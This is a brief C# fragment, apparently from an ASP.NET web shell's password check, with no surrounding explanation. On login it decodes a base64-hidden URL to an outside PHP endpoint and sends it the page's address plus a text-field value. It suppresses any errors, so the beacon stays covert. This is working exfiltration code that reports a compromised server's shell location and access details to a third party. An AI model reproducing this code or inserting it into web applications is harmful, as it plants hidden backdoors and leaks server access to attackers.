...
if(Jfm==Password || HRJ.Text==this.Request.Url.ToString())
{
try{
	string uriurl = System.Text.Encoding.Default.GetString(System.Convert.FromBase64String("aHR0cDovLzQ1Njc3Nzg5LmNvbS8xMTExMS5waHA/aG09")); 
	WebClient wc = new WebClient(); 
	uriurl = uriurl + Request.Url + "||" + HRJ.Text + "&" + "b" + "z" + "=" + "a" + "s" + "p" + "x";
	Stream st = wc.OpenRead(uriurl); 
	StreamReader sr = new StreamReader(st); 
	string respresp = sr.ReadToEnd(); sr.Close(); 
	st.Close();
}catch (Exception) { }
